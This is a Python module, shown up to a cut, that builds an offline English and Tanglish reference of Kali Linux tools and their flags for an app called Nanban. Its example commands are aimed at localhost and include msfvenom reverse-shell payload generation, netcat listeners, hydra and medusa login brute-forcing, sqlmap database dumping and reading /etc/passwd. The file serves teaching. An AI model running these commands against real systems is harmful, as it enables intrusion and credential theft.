"""
Command dictionary for Nanban's Kali section.

A built-in, offline reference of the common Kali Linux / Linux tools and their flags,
each explained in English AND Tanglish. `explain(command_line)` parses a command the
user typed or ran and returns what the tool does plus what each flag in *their* command
means — like a man page that also speaks Tanglish. Anything not in here falls back to
the AI (the Kali panel handles that).

This is purely an educational reference (what commands do). It adds no capability.
Extend it by adding entries to TOOLS below — the format is self-explanatory.
"""

import shlex

# ---------------------------------------------------------------- the dictionary
# Each tool:
#   cat        - category
#   purpose    - one line, English
#   purpose_ta - one line, Tanglish
#   usage      - syntax template
#   example    - a safe example (own lab)
#   flags      - {flag: "english meaning"}
#   flags_ta   - {flag: "tanglish meaning"}  (optional; falls back to english)

TOOLS: dict[str, dict] = {
    # ---------------- recon / scanning ----------------
    "nmap": {
        "cat": "Recon / Scanning",
        "purpose": "Scan hosts and ports; detect running services, versions and the OS.",
        "purpose_ta": "Host-oda open ports, services, version, OS ellam scan panni kandupidikka.",
        "usage": "nmap [options] <target>",
        "example": "nmap -sV -p- 127.0.0.1",
        "flags": {
            "-sV": "detect the version of each service", "-sC": "run the default safe scripts",
            "-A": "aggressive: OS + version + scripts + traceroute", "-p": "which ports (-p80,443 or -p- for all)",
            "-p-": "scan all 65535 ports", "-Pn": "skip host-discovery, assume the host is up",
            "-sS": "stealthy SYN scan (needs root)", "-sU": "scan UDP ports", "-T4": "faster timing",
            "-oN": "save normal output to a file", "-oA": "save output in all formats", "-v": "verbose",
            "-h": "show help", "-sn": "ping scan: find live hosts only (no port scan)",
            "-sT": "TCP connect scan (no root needed)", "-O": "operating-system detection",
            "--script": "run NSE scripts (e.g. --script default or vuln)", "-oX": "save results as XML",
        },
        "flags_ta": {
            "-sV": "service-oda version kandupidikka", "-sC": "default scripts-a run panna",
            "-A": "ellame (OS+version+scripts) full scan", "-p": "entha ports-nu solla",
            "-p-": "ella 65535 ports-aiyum scan panna", "-Pn": "host up-a nu check pannama scan panna",
            "-sS": "stealth SYN scan (root venum)", "-sU": "UDP ports scan panna", "-T4": "vegama scan",
            "-v": "jaasti details kaatta",
        },
    },
    "masscan": {
        "cat": "Recon / Scanning",
        "purpose": "Very fast port scanner for large IP ranges.",
        "purpose_ta": "Periya IP range-a romba vegama scan panra port scanner.",
        "usage": "masscan <range> -p<ports> --rate <pps>",
        "example": "masscan 127.0.0.1 -p1-1000 --rate 1000",
        "flags": {"-p": "ports to scan", "--rate": "packets per second", "-oL": "save list output"},
    },
    "ping": {
        "cat": "Recon / Network",
        "purpose": "Check if a host is reachable and measure round-trip time.",
        "purpose_ta": "Oru host reach aaguthaa, evlo neram edukkuthu-nu check panna.",
        "usage": "ping <host>",
        "example": "ping -c 4 127.0.0.1",
        "flags": {"-c": "stop after N packets", "-i": "interval between packets", "-s": "packet size"},
        "flags_ta": {"-c": "N packets apram niruthu", "-i": "packets-ku idaiyila neram"},
    },
    "netdiscover": {
        "cat": "Recon / Network",
        "purpose": "Find live hosts on the local network using ARP.",
        "purpose_ta": "Local network-la live-a irukkura hosts-a ARP vachi kandupidikka.",
        "usage": "netdiscover -r <range>",
        "example": "netdiscover -r 192.168.1.0/24",
        "flags": {"-r": "the network range", "-i": "network interface"},
    },
    "whatweb": {
        "cat": "Recon / Web",
        "purpose": "Identify what technologies a website runs (CMS, server, JS libs).",
        "purpose_ta": "Oru website enna technology (CMS, server) use pannumnu kandupidikka.",
        "usage": "whatweb <url>",
        "example": "whatweb http://127.0.0.1:8080",
        "flags": {"-v": "verbose details", "-a": "aggression level (1-4)", "--help": "show help",
                  "--follow-redirect": "follow redirects (always/never)", "--log-brief": "save a brief text report",
                  "--log-xml": "export findings as XML", "--log-json": "export findings as JSON",
                  "--user-agent": "custom user-agent string", "--no-errors": "hide error messages",
                  "--color": "terminal colour (never for clean logs)", "-i": "scan a list of targets from a file",
                  "--proxy": "route through a proxy", "--cookie": "send a custom cookie"},
        "flags_ta": {"-a": "aggression level (1-4)", "--log-json": "JSON report save", "-i": "targets file-la irundhu scan",
                     "--proxy": "proxy vazhiya", "--cookie": "custom cookie anuppa"},
    },

    # ---------------- web testing ----------------
    "gobuster": {
        "cat": "Web / Content discovery",
        "purpose": "Brute-force hidden directories, files or DNS subdomains using a wordlist.",
        "purpose_ta": "Wordlist vachi hidden folders, files, subdomains-a kandupidikka.",
        "usage": "gobuster <mode> -u <url> -w <wordlist>",
        "example": "gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt",
        "flags": {
            "dir": "directory/file brute-force mode", "dns": "subdomain brute-force mode",
            "-u": "the target URL", "-w": "the wordlist file", "-x": "file extensions (php,txt)",
            "-t": "number of threads", "-k": "ignore TLS/SSL certificate errors", "-s": "status codes to show",
        },
        "flags_ta": {
            "dir": "folders/files-a brute-force panra mode", "-u": "target URL",
            "-w": "wordlist file", "-x": "file extensions solla (php,txt)", "-t": "evlo threads",
            "-k": "SSL certificate error-a ignore panna",
        },
    },
    "ffuf": {
        "cat": "Web / Fuzzing",
        "purpose": "Fast web fuzzer — put FUZZ in the URL and it tries every word from a list.",
        "purpose_ta": "URL-la FUZZ pottu, list-la irukkura ella word-aiyum vega-vegama try panra fuzzer.",
        "usage": "ffuf -u <url-with-FUZZ> -w <wordlist>",
        "example": "ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt",
        "flags": {"-u": "URL with the FUZZ keyword", "-w": "wordlist", "-mc": "match these HTTP codes",
                  "-fc": "hide these HTTP codes", "-fs": "hide responses of this size", "-t": "threads"},
    },
    "dirb": {
        "cat": "Web / Content discovery",
        "purpose": "Classic directory/file brute-forcer for web servers.",
        "purpose_ta": "Web server-la folders/files-a brute-force panra pazhaya tool.",
        "usage": "dirb <url> [wordlist]",
        "example": "dirb http://127.0.0.1:8080",
        "flags": {"-X": "file extensions", "-r": "don't recurse", "-z": "delay between requests"},
    },
    "nikto": {
        "cat": "Web / Scanner",
        "purpose": "Scan a web server for known vulnerabilities and misconfigurations.",
        "purpose_ta": "Web server-la theriyura vulnerabilities, thappu config-a scan panna.",
        "usage": "nikto -h <url>",
        "example": "nikto -h http://127.0.0.1:8080",
        "flags": {"-h": "the host/URL", "-p": "port", "-ssl": "force SSL/TLS", "-o": "output file",
                  "-Tuning": "limit tests to selected categories", "-Display": "output detail (V = verbose)",
                  "-Format": "report format (txt/json/csv/htm)", "-output": "report file name",
                  "-maxtime": "max runtime for the scan", "-timeout": "network timeout seconds",
                  "-useragent": "custom user-agent string", "-evasion": "IDS-evasion technique",
                  "-nointeractive": "disable interactive prompts", "-list-plugins": "list Nikto plugins",
                  "-update": "update Nikto databases/plugins"},
        "flags_ta": {"-h": "host/URL", "-ssl": "SSL force panna", "-output": "report file name",
                     "-Format": "report format (txt/json)", "-update": "database/plugins update"},
    },
    "wpscan": {
        "cat": "Web / WordPress",
        "purpose": "Scan a WordPress site for vulnerable plugins, themes and users.",
        "purpose_ta": "WordPress site-la vulnerable plugins, themes, users-a scan panna.",
        "usage": "wpscan --url <url>",
        "example": "wpscan --url http://127.0.0.1:8080 --enumerate u",
        "flags": {"--url": "the WordPress URL", "--enumerate": "what to list (u=users, p=plugins)",
                  "--passwords": "wordlist for password attack"},
    },
    "sqlmap": {
        "cat": "Web / SQL injection",
        "purpose": "Automatically find and exploit SQL-injection flaws; can dump databases.",
        "purpose_ta": "SQL injection bug-a automatic-a kandupidichu, database-a dump panna.",
        "usage": "sqlmap -u <url> [options]",
        "example": "sqlmap -u 'http://127.0.0.1:8080/vuln.php?id=1' --batch --dbs",
        "flags": {
            "-u": "the target URL", "--data": "POST body to test", "--batch": "assume defaults, no questions",
            "--dbs": "list the databases", "--tables": "list tables", "--dump": "extract the data",
            "-D": "pick a database", "-T": "pick a table", "--level": "test depth (1-5)",
            "--risk": "risk of payloads (1-3)", "--cookie": "send a session cookie",
        },
        "flags_ta": {
            "-u": "target URL", "--batch": "kelvi kekama defaults-a eduthuko",
            "--dbs": "databases-a list panna", "--tables": "tables-a list panna",
            "--dump": "data-va veliya eduka", "-D": "database select panna", "-T": "table select panna",
        },
    },
    "curl": {
        "cat": "Web / HTTP client",
        "purpose": "Make HTTP requests from the command line; inspect responses and headers.",
        "purpose_ta": "Command line-la HTTP request anuppi, response/headers-a paarka.",
        "usage": "curl [options] <url>",
        "example": "curl -i http://127.0.0.1:8080",
        "flags": {"-i": "include response headers", "-I": "headers only (HEAD)", "-X": "HTTP method (POST…)",
                  "-d": "request body data", "-H": "add a header", "-L": "follow redirects",
                  "-o": "save to a file", "-k": "ignore SSL cert errors", "-s": "silent"},
        "flags_ta": {"-i": "headers-aiyum kaatta", "-X": "method (POST/PUT) solla", "-d": "body data anuppa",
                     "-H": "header add panna", "-L": "redirect-a follow panna", "-k": "SSL error ignore"},
    },
    "wget": {
        "cat": "Web / Download",
        "purpose": "Download files or whole pages over HTTP/FTP.",
        "purpose_ta": "HTTP/FTP vazhiya files or pages-a download panna.",
        "usage": "wget [options] <url>",
        "example": "wget http://127.0.0.1:8080/file.txt",
        "flags": {"-O": "save as this filename", "-r": "download recursively", "-q": "quiet", "-c": "resume"},
    },

    # ---------------- passwords ----------------
    "hydra": {
        "cat": "Passwords / Brute-force",
        "purpose": "Online brute-force login attacks against many protocols (SSH, FTP, HTTP…).",
        "purpose_ta": "SSH, FTP, HTTP login-a username/password list vachi brute-force panna.",
        "usage": "hydra -l <user> -P <wordlist> <target> <service>",
        "example": "hydra -l admin -P rockyou.txt 127.0.0.1 ssh",
        "flags": {"-l": "a single username", "-L": "a username list", "-p": "a single password",
                  "-P": "a password wordlist", "-t": "parallel tasks", "-s": "custom port",
                  "-f": "stop when a login is found", "-V": "show every attempt"},
        "flags_ta": {"-l": "oru username", "-L": "username list", "-P": "password wordlist",
                     "-t": "evlo parallel try", "-f": "login kedacha niruthu"},
    },
    "john": {
        "cat": "Passwords / Cracking",
        "purpose": "John the Ripper — crack password hashes offline.",
        "purpose_ta": "Password hash-a offline-a crack panra tool (John the Ripper).",
        "usage": "john [options] <hashfile>",
        "example": "john --wordlist=rockyou.txt hashes.txt",
        "flags": {"--wordlist": "wordlist to try", "--format": "hash type (e.g. raw-md5)",
                  "--show": "show cracked passwords", "--rules": "apply mangling rules"},
        "flags_ta": {"--wordlist": "entha wordlist try panna", "--format": "hash type solla",
                     "--show": "crack aana passwords-a kaatta"},
    },
    "hashcat": {
        "cat": "Passwords / Cracking",
        "purpose": "GPU-accelerated password-hash cracker.",
        "purpose_ta": "GPU vachi romba vegama password hash crack panra tool.",
        "usage": "hashcat -m <mode> -a <attack> <hashfile> <wordlist>",
        "example": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
        "flags": {"-m": "hash type number (0=MD5, 1000=NTLM)", "-a": "attack mode (0=wordlist)",
                  "-o": "output file", "--force": "ignore warnings", "--show": "show cracked"},
        "flags_ta": {"-m": "hash type number", "-a": "attack mode (0=wordlist)", "--show": "crack aanadhu kaatta"},
    },
    "crunch": {
        "cat": "Passwords / Wordlists",
        "purpose": "Generate custom wordlists by pattern and length.",
        "purpose_ta": "Pattern/length vachi custom wordlist-a generate panna.",
        "usage": "crunch <min> <max> [charset] -o <file>",
        "example": "crunch 6 8 -o list.txt",
        "flags": {"-o": "output file", "-t": "pattern", "-d": "limit duplicate characters"},
    },

    # ---------------- exploitation ----------------
    "msfconsole": {
        "cat": "Exploitation / Metasploit",
        "purpose": "The Metasploit framework console — search, configure and run exploits/payloads.",
        "purpose_ta": "Metasploit console — exploits/payloads-a thedi, set panni, run panna.",
        "usage": "msfconsole  (then: search / use / set / run)",
        "example": "msfconsole -q",
        "flags": {"-q": "quiet (no banner)", "-r": "run a resource script", "-x": "run commands then stay"},
    },
    "msfvenom": {
        "cat": "Exploitation / Payloads",
        "purpose": "Generate payloads/shellcode in many formats.",
        "purpose_ta": "Different formats-la payload/shellcode generate panna.",
        "usage": "msfvenom -p <payload> LHOST=.. LPORT=.. -f <format> -o <file>",
        "example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell",
        "flags": {"-p": "the payload", "-f": "output format (elf, exe, raw)", "-o": "output file",
                  "-e": "encoder", "LHOST": "your listener IP", "LPORT": "your listener port"},
    },
    "searchsploit": {
        "cat": "Exploitation / Exploit-DB",
        "purpose": "Search the local Exploit-DB copy for public exploits.",
        "purpose_ta": "Local Exploit-DB-la public exploits-a thedi paarka.",
        "usage": "searchsploit <keywords>",
        "example": "searchsploit apache 2.4",
        "flags": {"-m": "copy an exploit to the current folder", "-x": "view an exploit", "-w": "show the web link"},
    },
    "nc": {
        "cat": "Exploitation / Networking",
        "purpose": "Netcat — read/write raw TCP/UDP; make listeners and reverse shells.",
        "purpose_ta": "Netcat — raw TCP/UDP connection, listener, reverse shell panna.",
        "usage": "nc [options] <host> <port>",
        "example": "nc -lvnp 4444",
        "flags": {"-l": "listen mode", "-v": "verbose", "-n": "no DNS lookups", "-p": "port",
                  "-e": "run a program on connect", "-lvnp": "listen + verbose + numeric + port (common combo)"},
        "flags_ta": {"-l": "listen panna", "-v": "details kaatta", "-p": "port solla",
                     "-lvnp": "listener setup panra common combo"},
    },
    "netcat": {"alias": "nc"},

    # ---------------- network / wireless ----------------
    "tcpdump": {
        "cat": "Network / Sniffing",
        "purpose": "Capture and inspect network packets from the command line.",
        "purpose_ta": "Command line-la network packets-a capture panni paarka.",
        "usage": "tcpdump -i <interface> [filter]",
        "example": "tcpdump -i eth0 -n port 80",
        "flags": {"-i": "interface to listen on", "-n": "don't resolve names", "-w": "write to a pcap file",
                  "-r": "read a pcap file", "-c": "stop after N packets", "-A": "print payload as text"},
        "flags_ta": {"-i": "entha interface", "-n": "name resolve panna vendam", "-w": "pcap file-la save",
                     "-c": "N packets apram niruthu"},
    },
    "aircrack-ng": {
        "cat": "Wireless",
        "purpose": "Crack WEP/WPA Wi-Fi keys from captured handshakes (your own network).",
        "purpose_ta": "Un sontha Wi-Fi handshake-la irundhu WPA key-a crack panna.",
        "usage": "aircrack-ng -w <wordlist> <capture.cap>",
        "example": "aircrack-ng -w rockyou.txt capture.cap",
        "flags": {"-w": "wordlist", "-b": "target BSSID"},
    },

    # ---------------- Active Directory / Windows ----------------
    "crackmapexec": {
        "cat": "Active Directory",
        "purpose": "Swiss-army knife for AD/SMB: check creds across many hosts, enumerate shares.",
        "purpose_ta": "AD/SMB-ku ella-in-one tool: credentials check, shares enumerate panna.",
        "usage": "crackmapexec <proto> <targets> -u <user> -p <pass>",
        "example": "crackmapexec smb 127.0.0.1 -u user -p pass",
        "flags": {"smb": "use the SMB protocol", "-u": "username(s)", "-p": "password(s)",
                  "--shares": "list shares", "-x": "run a command"},
    },
    "enum4linux": {
        "cat": "Active Directory / SMB",
        "purpose": "Enumerate users, shares and policies from Windows/Samba via SMB.",
        "purpose_ta": "SMB vazhiya Windows/Samba-la users, shares, policy-a enumerate panna.",
        "usage": "enum4linux <target>",
        "example": "enum4linux -a 127.0.0.1",
        "flags": {"-a": "do everything", "-U": "list users", "-S": "list shares"},
    },
    "smbclient": {
        "cat": "Active Directory / SMB",
        "purpose": "Connect to Windows SMB file shares, like an FTP client.",
        "purpose_ta": "Windows SMB file shares-ku FTP mari connect panna.",
        "usage": "smbclient //<host>/<share> -U <user>",
        "example": "smbclient -L //127.0.0.1 -N",
        "flags": {"-L": "list the shares", "-U": "username", "-N": "no password", "-p": "port"},
    },
    "evil-winrm": {
        "cat": "Active Directory / Windows",
        "purpose": "Get an interactive WinRM shell on a Windows host with valid creds.",
        "purpose_ta": "Valid credentials vachi Windows host-la WinRM shell eduka.",
        "usage": "evil-winrm -i <host> -u <user> -p <pass>",
        "example": "evil-winrm -i 127.0.0.1 -u admin -p pass",
        "flags": {"-i": "target IP", "-u": "username", "-p": "password", "-H": "NTLM hash instead of password"},
    },

    # ---------------- privesc / enumeration ----------------
    "linpeas": {
        "cat": "Privilege Escalation",
        "purpose": "Enumerate a Linux box for privilege-escalation paths (misconfigs, SUID, creds).",
        "purpose_ta": "Linux box-la privilege escalation vazhi (misconfig, SUID)-a kandupidikka.",
        "usage": "./linpeas.sh",
        "example": "./linpeas.sh | tee linpeas.txt",
        "flags": {"-a": "all checks", "-q": "quiet"},
    },
    "find": {
        "cat": "Linux / Privesc",
        "purpose": "Search the filesystem; a privesc favourite for finding SUID files.",
        "purpose_ta": "Filesystem-la files thedurathu; SUID files kandupidika privesc-la use.",
        "usage": "find <path> [tests]",
        "example": "find / -perm -4000 2>/dev/null",
        "flags": {"-perm": "match permission bits (-4000 = SUID)", "-name": "match by name",
                  "-type": "f=file d=dir", "-exec": "run a command on each match", "2>/dev/null": "hide errors"},
        "flags_ta": {"-perm": "permission bits match (-4000 = SUID)", "-name": "name vachi thedu",
                     "-type": "f=file d=folder", "2>/dev/null": "error messages-a hide panna"},
    },
    "sudo": {
        "cat": "Linux / Privesc",
        "purpose": "Run a command as another user (usually root).",
        "purpose_ta": "Innoru user-a (usually root) command run panna.",
        "usage": "sudo [options] <command>",
        "example": "sudo -l",
        "flags": {"-l": "list what you're allowed to run", "-u": "run as this user", "-i": "login shell as root"},
        "flags_ta": {"-l": "neenga enna run pannalaam-nu list panna", "-u": "entha user-a run panna"},
    },

    # ---------------- everyday linux ----------------
    "ls": {"cat": "Linux / Files", "purpose": "List files in a directory.",
           "purpose_ta": "Folder-la files-a list panna.", "usage": "ls [options] [path]",
           "example": "ls -la", "flags": {"-l": "long detailed list", "-a": "show hidden files",
           "-h": "human-readable sizes", "-R": "recurse into folders"},
           "flags_ta": {"-l": "full details-oda list", "-a": "hidden files-aiyum kaatta"}},
    "cd": {"cat": "Linux / Files", "purpose": "Change the current directory.",
           "purpose_ta": "Current folder-a maatha.", "usage": "cd <path>", "example": "cd /var/www",
           "flags": {}},
    "cat": {"cat": "Linux / Files", "purpose": "Print the contents of a file.",
            "purpose_ta": "File-oda content-a print panna.", "usage": "cat <file>", "example": "cat /etc/passwd",
            "flags": {"-n": "number the lines"}},
    "grep": {"cat": "Linux / Text", "purpose": "Search text for lines matching a pattern.",
             "purpose_ta": "Pattern match aagura lines-a text-la thedu.", "usage": "grep [options] <pattern> <file>",
             "example": "grep -ri password .", "flags": {"-r": "search folders recursively",
             "-i": "ignore case", "-n": "show line numbers", "-v": "invert (lines that DON'T match)",
             "-E": "extended regex"}, "flags_ta": {"-r": "folders-oda recursive-a thedu",
             "-i": "case ignore panna", "-n": "line numbers kaatta"}},
    "chmod": {"cat": "Linux / Permissions", "purpose": "Change file permissions.",
              "purpose_ta": "File permission-a maatha.", "usage": "chmod <mode> <file>",
              "example": "chmod +x script.sh", "flags": {"+x": "make executable", "-R": "recurse",
              "777": "everyone can read/write/execute"}, "flags_ta": {"+x": "execute panna mudila",
              "-R": "folder-oda recursive"}},
    "ps": {"cat": "Linux / Processes", "purpose": "List running processes.",
           "purpose_ta": "Run aagura processes-a list panna.", "usage": "ps [options]", "example": "ps aux",
           "flags": {"aux": "show all processes with details", "-ef": "full-format listing"}},
    "ss": {"cat": "Linux / Network", "purpose": "Show open sockets / listening ports.",
           "purpose_ta": "Open sockets / listening ports-a kaatta.", "usage": "ss [options]",
           "example": "ss -tlnp", "flags": {"-t": "TCP", "-u": "UDP", "-l": "listening only",
           "-n": "numeric", "-p": "show the process"}, "flags_ta": {"-l": "listening-a mattum",
           "-p": "entha process-nu kaatta"}},
    "ssh": {"cat": "Linux / Remote", "purpose": "Log in to a remote machine securely.",
            "purpose_ta": "Remote machine-ku secure-a login panna.", "usage": "ssh <user>@<host>",
            "example": "ssh nanban@127.0.0.1", "flags": {"-p": "port", "-i": "identity (key) file",
            "-v": "verbose for debugging"}, "flags_ta": {"-p": "port solla", "-i": "key file use panna"}},
    "scp": {"cat": "Linux / Remote", "purpose": "Copy files to/from a remote machine over SSH.",
            "purpose_ta": "SSH vazhiya remote machine-ku files copy panna.", "usage": "scp <src> <dst>",
            "example": "scp file.txt nanban@127.0.0.1:/tmp/", "flags": {"-r": "copy folders", "-P": "port"}},
    "apt": {"cat": "Linux / Packages", "purpose": "Install, update and remove software on Debian/Kali.",
            "purpose_ta": "Kali/Debian-la software install, update, remove panna.", "usage": "apt <command>",
            "example": "sudo apt install nmap", "flags": {"install": "install a package",
            "update": "refresh the package list", "full-upgrade": "upgrade everything", "search": "search packages",
            "remove": "uninstall"}, "flags_ta": {"install": "package install panna", "update": "list refresh panna",
            "search": "package thedu"}},

    # ================= OSINT / Recon =================
    "theharvester": {
        "cat": "OSINT / Recon",
        "purpose": "Gather emails, subdomains, hosts and names for a domain from public sources (OSINT).",
        "purpose_ta": "Oru domain-oda emails, subdomains, hosts, names-a public sources-la sekarikka (OSINT).",
        "usage": "theHarvester -d <domain> -b <source>",
        "example": "theHarvester -d example.com -b all -l 200",
        "flags": {"-d": "target domain", "-b": "data source (all/google/bing/duckduckgo/linkedin/github)",
                  "-l": "limit number of results", "-s": "start offset", "-f": "save results to a report",
                  "-c": "DNS brute-force", "-n": "reverse DNS lookup", "-t": "DNS TLD expansion",
                  "-p": "resolve hosts to IPs", "-e": "use a chosen DNS server", "-v": "verbose", "-q": "quiet"},
        "flags_ta": {"-d": "target domain", "-b": "entha source (google/bing/linkedin/github/all)",
                     "-l": "evlo results", "-f": "report-a save panna", "-p": "hosts-a IP-a resolve panna"},
    },
    "subfinder": {
        "cat": "Recon / Subdomains",
        "purpose": "Fast passive subdomain discovery for a domain.",
        "purpose_ta": "Oru domain-oda subdomains-a vegama, passive-a kandupidikka.",
        "usage": "subfinder -d <domain>",
        "example": "subfinder -d example.com -all -silent -o subs.txt",
        "flags": {"-d": "find subdomains for one domain", "-dL": "load domains from a file", "-all": "use all sources",
                  "-silent": "show only results", "-o": "save output to a file", "-oJ": "write JSON output",
                  "-nW": "show only active results", "-recursive": "use recursive sources", "-sources": "choose sources",
                  "-exclude-sources": "exclude a source", "-timeout": "timeout seconds", "-rl": "rate limit",
                  "-proxy": "use a proxy", "-config": "use a custom config file"},
        "flags_ta": {"-d": "oru domain", "-all": "ella sources", "-silent": "results mattum", "-o": "file-la save"},
    },

    # ================= Forensics / Metadata =================
    "exiftool": {
        "cat": "Forensics / Metadata",
        "purpose": "Read, write and strip image/file metadata (EXIF, GPS, timestamps).",
        "purpose_ta": "Image/file metadata (EXIF, GPS, time)-a padikka, write panna, remove panna.",
        "usage": "exiftool [options] <file>",
        "example": "exiftool -GPS:all -DateTimeOriginal photo.jpg",
        "flags": {"-ver": "show version", "-a": "show duplicate tags too", "-s": "short tag names",
                  "-S": "very short output", "-g1": "group tags by category", "-time:all": "show date/time tags",
                  "-GPS:all": "show GPS-related tags", "-json": "export metadata as JSON", "-csv": "export as CSV",
                  "-X": "export as XML", "-htmlDump": "HTML metadata dump", "-list": "list all tags",
                  "-all=": "remove all metadata (on a copy)", "-overwrite_original": "strip metadata in place",
                  "-r": "process a directory recursively", "-ext": "limit to a chosen extension"},
        "flags_ta": {"-GPS:all": "GPS tags kaatta", "-all=": "metadata-va remove panna", "-r": "folder recursive",
                     "-json": "JSON-a export panna", "-DateTimeOriginal": "photo eduttha time kaatta"},
    },
    "yara": {
        "cat": "Forensics / Malware",
        "purpose": "Match files against YARA rules to hunt malware or byte patterns.",
        "purpose_ta": "Files-a YARA rules vachi match panni malware/pattern thedu.",
        "usage": "yara [options] <rules.yar> <target>",
        "example": "yara -r -s rules.yar samples/",
        "flags": {"-r": "scan directories recursively", "-s": "show matching strings", "-m": "show rule metadata",
                  "-g": "show matching tags", "-n": "limit matching strings shown", "-p": "use worker threads",
                  "-l": "limit number of results", "-f": "fast mode (stop at first match)", "-w": "disable warnings",
                  "-C": "use precompiled rules", "-t": "require a specific tag", "-d": "pass an external variable"},
    },
    "binwalk": {
        "cat": "Forensics / Firmware",
        "purpose": "Analyse firmware images for embedded files/signatures and extract them.",
        "purpose_ta": "Firmware image-la embedded files/signatures-a analyse panni extract panna.",
        "usage": "binwalk [options] <firmware.bin>",
        "example": "binwalk -Me firmware.bin",
        "flags": {"-e": "extract embedded files automatically", "-Me": "recursively extract nested content",
                  "-B": "raw byte signature scan", "-A": "scan for executable code patterns", "-E": "entropy analysis",
                  "-y": "only a signature type", "-R": "custom raw signature", "-D": "extract matching data",
                  "-W": "compare two files", "-o": "start at an offset", "-l": "limit scan length", "-I": "file info only"},
        "flags_ta": {"-e": "embedded files extract panna", "-Me": "nested-a recursive extract", "-E": "entropy paarka"},
    },

    # ================= Network / Sniffing =================
    "tshark": {
        "cat": "Network / Sniffing",
        "purpose": "Wireshark's command-line packet capture and analysis.",
        "purpose_ta": "Wireshark-oda command-line version — packets capture panni analyse panna.",
        "usage": "tshark [options]",
        "example": "tshark -r capture.pcap -Y \"http\"",
        "flags": {"-D": "list capture interfaces", "-i": "capture on an interface", "-c": "stop after N packets",
                  "-f": "capture filter (live)", "-r": "read a pcap file", "-Y": "display filter",
                  "-T": "output type (e.g. fields)", "-e": "pick a field to print", "-q": "quiet (for stats)",
                  "-z": "statistics (io,phs / conv,tcp)", "-w": "write capture to a file", "-V": "full packet detail"},
        "flags_ta": {"-i": "entha interface-la capture", "-r": "pcap file padikka", "-Y": "display filter",
                     "-w": "file-la save", "-D": "interfaces list"},
    },

    # ================= Web / discovery & fuzzing =================
    "feroxbuster": {
        "cat": "Web / Content discovery",
        "purpose": "Fast recursive directory/file discovery on web apps (Rust).",
        "purpose_ta": "Web app-la folders/files-a vegama recursive-a kandupidikka.",
        "usage": "feroxbuster -u <url> [options]",
        "example": "feroxbuster -u http://127.0.0.1:8080 -w wordlist.txt -x php,html",
        "flags": {"-u": "target URL", "-w": "wordlist", "-x": "file extensions (php,html,js)",
                  "-C": "filter out a status code", "-s": "show only these status codes", "-t": "threads",
                  "-L": "scan depth", "-r": "follow redirects", "-k": "ignore TLS cert errors", "-n": "no recursion",
                  "-o": "output file", "--filter-size": "hide a body size", "--rate-limit": "requests per second",
                  "--resume-from": "resume a previous scan"},
        "flags_ta": {"-u": "target URL", "-w": "wordlist", "-x": "extensions", "-t": "threads", "-k": "SSL error ignore"},
    },
    "wfuzz": {
        "cat": "Web / Fuzzing",
        "purpose": "Brute-force/fuzz web requests (params, dirs, logins) using FUZZ markers.",
        "purpose_ta": "Web request-la FUZZ marker vachi params/dirs/logins-a fuzz panna.",
        "usage": "wfuzz -z <payload> -w <wordlist> <url-with-FUZZ>",
        "example": "wfuzz -c -z file,users.txt --sc 200 \"http://127.0.0.1/login?u=FUZZ\"",
        "flags": {"-c": "coloured output", "-z": "payload source (file,list,range)", "-w": "wordlist",
                  "--sc": "show only these HTTP codes", "--hc": "hide these HTTP codes", "--hl": "hide by line count",
                  "--hw": "hide by word count", "--hh": "hide by char count", "-d": "POST data", "-t": "connections"},
        "flags_ta": {"-z": "payload source", "-w": "wordlist", "--sc": "indha codes mattum kaatta",
                     "--hc": "indha codes-a hide panna"},
    },
    "burpsuite": {
        "cat": "Web / Proxy (GUI)",
        "purpose": "The standard web-app testing proxy — intercept, repeat, fuzz and scan HTTP(S). Mostly used via its GUI.",
        "purpose_ta": "Web-app testing proxy — HTTP(S) intercept, repeat, fuzz, scan. Mostly GUI vazhiya use.",
        "usage": "burpsuite    (opens the GUI)",
        "example": "burpsuite &",
        "flags": {"proxy": "intercept & modify HTTP requests", "repeater": "modify and resend a request",
                  "intruder": "automated attacks / fuzzing", "scanner": "scan for common vulnerabilities",
                  "decoder": "encode/decode data (Base64, URL)", "comparer": "diff two requests/responses",
                  "sequencer": "analyse token randomness", "target scope": "define what's in scope",
                  "extender": "add extensions (BApp store)"},
        "flags_ta": {"proxy": "requests-a intercept/modify panna", "repeater": "request-a thirumba anuppa",
                     "intruder": "automated fuzzing", "scanner": "vulnerabilities scan"},
    },

    # ================= Passwords (more) =================
    "medusa": {
        "cat": "Passwords / Brute-force",
        "purpose": "Fast, parallel login brute-forcer across many protocols (SSH, FTP, SMB, RDP).",
        "purpose_ta": "Pala protocols-la (SSH, FTP, SMB, RDP) parallel-a login brute-force panra tool.",
        "usage": "medusa -h <host> -u <user> -P <wordlist> -M <service>",
        "example": "medusa -h 127.0.0.1 -u admin -P rockyou.txt -M ssh",
        "flags": {"-h": "target host", "-H": "host list", "-u": "a single username", "-U": "username list",
                  "-p": "a single password", "-P": "password list", "-M": "the service/module (ssh, ftp, smb)",
                  "-t": "parallel logins", "-f": "stop at first success", "-n": "custom port"},
        "flags_ta": {"-h": "target host", "-U": "username list", "-P": "password list", "-M": "service solla (ssh/ftp)"},
    },
    "ncrack": {
        "cat": "Passwords / Brute-force",
        "purpose": "Network login brute-forcer with fine control (SSH, RDP, FTP, SMB).",
        "purpose_ta": "Network login brute-force (SSH, RDP, FTP, SMB) fine control-oda.",
        "usage": "ncrack [options] <target>",
        "example": "ncrack -p 22 127.0.0.1 -U users.txt -P pass.txt",
        "flags": {"-p": "port/service", "-U": "username list", "-P": "password list", "--user": "a single user",
                  "--pass": "a single password", "-T": "timing template", "-v": "verbose"},
        "flags_ta": {"-p": "port solla", "-U": "username list", "-P": "password list"},
    },
    "ophcrack": {
        "cat": "Passwords / Windows",
        "purpose": "Recover Windows LM/NTLM passwords using rainbow tables.",
        "purpose_ta": "Windows LM/NTLM passwords-a rainbow tables vachi recover panna.",
        "usage": "ophcrack-cli -g -d <hashfile> -t <tables>",
        "example": "ophcrack-cli -g -d hashes.txt -t tables/",
        "flags": {"-g": "no GUI (command line)", "-d": "hash file", "-t": "rainbow tables folder", "-n": "number of tables"},
    },
    "ophcrack-cli": {"alias": "ophcrack"},
    "rcrack": {
        "cat": "Passwords / Rainbow tables",
        "purpose": "Crack hashes using precomputed rainbow tables (RainbowCrack).",
        "purpose_ta": "Precomputed rainbow tables vachi hashes crack panna (RainbowCrack).",
